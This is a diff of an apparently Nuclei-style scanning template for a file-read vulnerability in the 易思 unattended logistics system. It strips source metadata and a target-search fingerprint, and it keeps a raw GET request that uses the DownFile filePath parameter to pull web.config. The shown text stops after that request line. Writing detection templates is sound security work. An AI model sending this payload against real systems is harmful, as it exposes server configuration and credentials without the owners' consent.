@@ -3,14 +3,8 @@ info:
   name: 易思智能物流无人值守系统downfile文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/3137d8902361c8b3b0887d0eaaeeed64
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 3137d8902361c8b3b0887d0eaaeeed64
-    fofa: + hunter`web.body=="易思无人值守智能物流"`
 http:
 - raw:
   - 'GET /PublicInfoManage/Upload/DownFile?filePath=web.config  HTTP/1.1
